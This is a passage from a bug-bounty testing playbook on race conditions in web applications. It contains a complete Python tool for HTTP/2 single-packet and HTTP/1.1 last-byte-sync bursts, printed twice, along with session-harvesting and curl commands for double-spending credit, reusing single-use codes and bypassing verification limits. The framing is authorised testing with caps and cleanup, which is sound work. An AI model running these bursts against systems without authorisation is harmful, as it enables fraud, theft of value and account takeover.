# RAC · Race conditions

> Two requests read the same state before either one writes it, so a check that should pass once passes twice: a
> code redeemed twice, one balance spent twice, a limit of five exceeded, a confirmation applied to the wrong
> address. It pays when the over-limit state sits in our own account, reproduces at a stated rate, and the thing
> raced is money, identity or a security check. Extra votes, likes and plan slots are mostly low or excluded.

| | |
|---|---|
| **Class** | `race` |
| **Applies when** | http, app\|api |
| **Pays** | 89 disclosed reports filed under the class (15 more touch it), 17 paid, median $500, top $15,250. The best-paid web reports raced a confirmation or verification step (a partner e-mail confirmation, a limit on verifications, an e-mail activation reward) or moved value twice (a token faucet, a credit transfer); count-limit overruns paid $100 to $500, and several paid rows are library and memory-safety bugs outside this chapter. |
| **Weaknesses** | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'), Time-of-check Time-of-use (TOCTOU) Race Condition, Improper Synchronization, Leveraging Race Conditions · CWE-362, CWE-367, CWE-662 |

## Why it pays

A race lives wherever a handler reads state, decides, and records the decision in a separate statement: "has this
code been used", "is the balance enough", "are there fewer than five", "how many wrong codes so far", "which
address is pending". Application servers run requests concurrently (threads, processes, an event loop waiting on
the database), and these checks are rarely inside a transaction with a row lock or behind a unique constraint.
The window is often a few milliseconds, which network jitter used to hide. The single-packet attack (HTTP/2:
every request sent except its last byte, then all the last bytes in one TCP packet) and last-byte synchronisation
(HTTP/1.1: the same idea over one connection per request) land twenty or thirty requests inside that window over
the internet. Every card here uses one harness that does both.

The paying shapes in `kb/reports/race.md`:

- **A confirmation or verification raced.** #300305 ($15,250): Shopify's partner e-mail confirmation bypassed, so
  a partner could request store access under an address it did not own, and a staff account on that address
  would have been converted to a collaborator; #2110030 ($3,000): the maximum number of verifications was not
  synchronised across parallel requests; #509629 ($2,000): an e-mail activation reward granted again and again.
- **Value moved twice.** #1438052 ($5,000): a faucet whose transfer function made two separate actions per
  request, a query first; #974892 ($250): transferring data credits to an organisation added extra free credits;
  #759247 (rated high, no bounty listed): gift cards redeemed several times; #429026 (medium): a retest paid twice.
- **A count exceeded.** #413759 ($500): store locations beyond the plan limit; #1540969 ($500): joining a CTF
  group; #59179 ($216): coupon codes; #996141 ($150): one person removing a hundred likes; #395351 ($100):
  white-label subdomains beyond five, which the programme called a soft limit.

Rate on what was shown: the over-limit state in our account and the success rate over the runs
(`docs/04-evidence-standard.md`). A race won once in fifty bursts is `AC:H` (`docs/06-severity.md`). Shopify's
closing note on #413759 says it no longer accepts race reports that bypass plan limits, and many policies exclude
promotions (`promo-abuse`): the money, identity and security-check cards come first for that reason. The rows for
curl, Node.js and the Rust standard library are local TOCTOU bugs in libraries, reported to their own programmes;
they are not prior art for a web target.

## The crux question

**Which actions does the application allow only once, only up to a count, or only while a balance or a pending
state lasts, and does it decide that by reading the state before it writes the result, so that twenty requests
released together all read the same answer?**

## Applicability probe

The chapter gate is settled by the fingerprint. The items gate on the features that hold a "once" or a limit
(`limited-action`, `payments`, `quota`, `invite`, `mfa`, `password-reset`, `email-out`, `signup`, `upload`,
`api-keys`); most are set while mapping the application. The transport decides how every burst is sent.

```bash
# 1. transport: "2" means HTTP/2 (race.py's default mode), "1.1" means add --h1 to every race.py call on this asset
curl -sS "${HDR[@]}" --http2 -o /dev/null -w 'protocol %{http_version}\n' "$T/"
# 2. race.py needs the h2 library for HTTP/2; its --h1 mode needs nothing
python3 -c 'import h2' 2>/dev/null && echo 'h2 present' || echo 'install once: python3 -m pip install --user h2'
# 3. the vocabulary of limits, balances and one-time steps in the crawl and the bundles
grep -rEoh '/[A-Za-z0-9_/-]*(redeem|claim|coupon|voucher|promo|gift|reward|bonus|credit|wallet|balance|transfer|withdraw|payout|vote|like|follow|review|invit|seat|quota|limit|verify|confirm|otp|2fa|mfa|reset|register|signup|upload)[A-Za-z0-9_/-]*' \
  "$E/recon/$H/" | sort | uniq -c | sort -rn | head -60
```

Then walk the application authenticated and write `$E/recon/$H/race-map.md`, one row per rule: the rule as the
product states it ("one use per customer", "max 5 workspaces", "5 attempts", "confirm your new address"), the
request that consumes it, where the result shows in our account, and how to get a fresh instance for each burst
(another code, a deleted object, a new address of ours).

```bash
scripts/sane fact set "$H" http2=1 --ev "curl --http2 negotiated HTTP/2 on /"
scripts/sane fact set "$H" limited-action=1 quota=1 --ev "promo code at checkout, one use per customer; free plan: 3 projects"
scripts/sane fact set "$H" payments=1 --ev "store credit in /account/wallet; gift cards redeem into it; transfers between users"
scripts/sane fact set "$H" email-out=1 upload=1 --ev "e-mail change mails a confirmation link; avatar and attachment uploads"
# nothing in the walk is limited, priced, mailed or uploaded:
scripts/sane fact set "$H" limited-action=0 payments=0 quota=0 invite=0 upload=0 --ev "walked every settings page as A: no codes, credits, limits, invitations or uploads"
```

With every feature fact false only RAC-001 remains, and it is a measurement: park it and move on. `http2` closes no
card: with it false every burst uses `--h1` (last-byte synchronisation), which is looser but still sends the
requests' final bytes back to back. Four rules hold for every card:

- **Scale.** One burst is 20 to 30 requests; `race.py` refuses more than 50. At most five bursts per card on one
  asset, and `race.py` sleeps n/`$RATE` seconds after each, so bursts average out to the engagement rate. This is
  not load testing: never raise the count or the number of bursts to make a race appear.
- **Control first.** The same request sent one at a time must show the rule holding. If it already fails
  sequentially, the finding belongs to the BIZ or AUT card for that rule, not to this chapter.
- **State, not status.** After every burst, read the state with one ordinary request: balance, count, verified
  flag. Twenty `200` answers with one change in state is an idempotent handler, not a race.
- **Our own values, one instance.** Codes, balances, accounts and addresses are ours. Nothing is spent, withdrawn
  or moved off the platform; extra objects are deleted and listed in `cleanup.md`; the report states the extra
  value so the programme can reverse it.

## Triage order

RAC-001 (transport and session lock: decides how every other card sends) → RAC-007 (resets for two accounts in
one packet: a handful of requests, critical ceiling) → RAC-006 (two e-mail changes in one packet: high ceiling) →
RAC-005 (one packet of codes against the attempt cap) → RAC-003 (stored value spent twice: needs a balance) →
RAC-009 (use during creation: rare, high) → RAC-002 (one-time promotions: often `promo-abuse`) → RAC-004 (count
limits, votes, single-use codes: usually low) → RAC-008 (duplicate registrations: low unless something routes by
the identifier) → RAC-010 (upload window: needs a predictable stored URL, worth most on PHP).

## Items

### RAC-001 · Requests released in one packet are processed in parallel, not one after another behind a session lock

| | |
|---|---|
| **Severity** | None standalone; decides how every other RAC card sends its burst |
| **Requires** | account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') · CWE-362 |
| **Prior art** | #2142109, #493176 |

- **Where:** one authenticated, read-only request that makes the server do some work: a search, a filtered list,
  a dashboard; `/api/me` only as a last resort. The transport follows `http2`: true, the default mode; false, add
  `--h1` to every `race.py` call on this asset. Run this card first on each deployment: every other RAC card reads
  its note.
- **Test:** twenty copies released together come back in about the time of one when the application runs them
  concurrently. A lock held per session for the whole request (PHP's default file sessions, ASP.NET session state,
  some custom middleware) makes them come back in even steps of one request's time; the same burst with one
  session per request then comes back flat. Steps in both runs mean a single worker or a per-account lock, and the
  other RAC cards will mostly be negative.
- **How:** the first block is the same in every RAC card: it writes `$E/tools/race.py` once per engagement and
  defines `sessions`. The second holds this card's steps; put the saved requests from the race map in place of
  the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-001"; mkdir -p "$D"; P='/api/search?q=rac001'   # a read-only request that costs the server work
  # 1. transport: "2" = HTTP/2, the default; "1.1" = add --h1 to the race.py calls below and in every RAC card
  curl -sS "${HDR[@]}" $A --http2 -o /dev/null -w 'protocol %{http_version}\n' "$T$P"
  # 2. baseline: the request one at a time, seconds to the first byte
  for i in 1 2 3 4 5; do curl -sS "${HDR[@]}" $A -o /dev/null -w '%{time_starttransfer}\n' "$T$P"; sleep 1; done | tee "$D/baseline.txt"
  # 3. twenty in one packet, all in A's one session (--warm / first sends three GET / on the same connection)
  python3 "$E/tools/race.py" "${HDR[@]}" $A --warm / -n 20 --out "$D/one-session" -- GET "$T$P" | tee "$D/one-session.txt"
  # 4. twenty sessions of A (put the saved login request here), then the same burst with one session per request
  sessions "$E/tools/sessions-A.txt" /api/login '{"email":"<A e-mail>","password":"<A password>"}'
  grep -c '^Cookie: .' "$E/tools/sessions-A.txt"       # 20 expected; a bearer API: write "Authorization: Bearer <token>" lines instead
  python3 "$E/tools/race.py" "${HDR[@]}" $A --each "$E/tools/sessions-A.txt" --warm / -n 20 -- GET "$T$P" | tee "$D/each-session.txt"
  grep -h 'sorted' "$D/one-session.txt" "$D/each-session.txt"
  # 5. without Python: curl multiplexes twenty transfers on one HTTP/2 connection (a looser burst than the single packet)
  for i in $(seq -w 1 20); do printf 'url = "%s"\noutput = "%s/curl-%s.body"\n' "$T$P" "$D" "$i"; done > "$D/burst.cfg"
  curl -sS "${HDR[@]}" $A --http2 --parallel --parallel-max 20 -K "$D/burst.cfg" -w '%{http_code} %{time_starttransfer}\n'
  ```
  Read the `sorted` lines: about one request's time throughout means parallel; values climbing in equal steps
  means serial. Steps in `one-session.txt` and a flat `each-session.txt` mean a per-session lock: every RAC card on
  this asset then adds `--each "$E/tools/sessions-A.txt"` to its bursts.
- **Proof:** none on its own: this is the measurement the other cards rely on. Keep the three timing lines and
  park the card with the result:
  `scripts/sane mark "$H" RAC-001 parked --note "HTTP/2 single packet; one session: 52-509 ms in 50 ms steps (session lock); a session per request: flat 53-56 ms; use --each sessions-A.txt" --ev "$D"`.
- **Not a finding when:** everything here is a measurement and none of it is reported. Read it correctly: one slow
  first answer and the rest flat is a cold connection (keep `--warm /`); `RST` or `429` on part of the burst is a
  limiter in front, so keep twenty and wait longer between bursts, never send more; a product that ends the
  previous session at every login leaves `sessions` with one live cookie, and the per-session workaround is not
  available; answers served from a cache (`Age`, `X-Cache: HIT`) measured the cache, so pick a request that is
  not cached.
- **Escalate:** every other RAC card, with the transport and the `--each` decision from here. The same release
  also gives a timing comparison that network jitter does not blur: two requests in one packet whose answers come
  back in a stable order show which one the server worked on longer. #493176 ($2,500) is titled "Partial report
  contents leakage - via HTTP/2 concurrent stream handling"; read its full text (`scripts/sane kb show 493176`)
  before building a leak on that idea.

### RAC-002 · A single-use promotion code or one-time bonus is granted more than once when the claims arrive in one packet

| | |
|---|---|
| **Severity** | Low standalone for one extra use of a promotion; Medium when the extra grant is account credit or paid time and nothing bounds the repetition |
| **Requires** | limited-action, account |
| **Excluded by** | promo-abuse |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Time-of-check Time-of-use (TOCTOU) Race Condition · CWE-367 |
| **Prior art** | #509629, #59179, #1717650, #331940 |

- **Where:** single-use promotion codes and vouchers we hold legitimately (a welcome code mailed to our account, a
  code we create in our own merchant or admin test account, a public code limited to one use per customer), and
  one-time bonuses: rewards for verifying an e-mail address or completing a profile, first-order credit, loyalty
  and referral claims, free premium days, "claim offer" buttons. Every burst consumes one grant, so the race map
  says how a fresh one is obtained (another code of the same promotion, our second workspace). Codes that were
  guessed, found or belong to someone else are never used.
- **Test:** the handler reads "has this code, or this account, claimed it?", grants, and only then records the
  claim. Every request that reads before the first record passes. Release the same claim twenty times together and
  count the grants in the account, not the `200` answers.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
